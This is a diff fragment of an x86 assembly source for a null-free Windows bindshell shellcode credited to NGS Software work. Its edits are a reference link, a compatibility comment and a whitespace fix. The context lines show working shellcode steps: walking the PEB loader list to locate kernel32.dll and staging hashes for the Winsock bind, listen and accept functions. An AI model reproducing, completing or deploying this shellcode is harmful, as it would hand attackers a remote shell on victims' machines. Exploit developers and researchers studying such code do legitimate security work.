@@ -1,5 +1,6 @@
 BITS 32
 ; Windows x86 null-free bindshell for Windows 5.0-6.0 all service packs.
+; (See http://skypher.com/wiki/index.php/Hacking/Shellcode/Bind/NGS).
 ; Based mainly on code and ideas (C) 2005 by Dafydd Stuttard, NGS Software.
 ; (See http://www.ngssoftware.com/papers/WritingSmallShellcode.pdf).
 ; Thanks to Pete Beck.
@@ -44,7 +45,7 @@ offset_WSAStartup_in_hash_table         equ 2
 
 start:
     XOR     ECX, ECX                    ; ECX = 0
-; Find base address of kernel32.dll 
+; Find base address of kernel32.dll. This code should work on Windows 5.0-7.0
     MOV     ESI, [FS:ECX + 0x30]        ; ESI = &(PEB) ([FS:0x30])
     MOV     ESI, [ESI + 0x0C]           ; ESI = PEB->Ldr
     MOV     ESI, [ESI + 0x1C]           ; ESI = PEB->Ldr.InInitOrder (first module)
@@ -55,7 +56,7 @@ next_module:
     CMP     [EDI + 12*2], CL            ; modulename[12] == 0 ? strlen("kernel32.dll") == 12
     JNE     next_module                 ; No: try next module.
 
-; Create hash table  and "ws2_32" (for LoadLibraryA) on the stack:
+; Create hash table and "ws2_32" (for LoadLibraryA) on the stack:
     PUSH    BYTE '2'                    ; Stack = "2"
     PUSH    B2DW('s', '2', '_', '3')    ; Stack = "s2_32"
     PUSH    B2DW(hash_ws2_32_bind, hash_ws2_32_listen, hash_ws2_32_accept, 'w') ; hash, hash, "ws2_32"
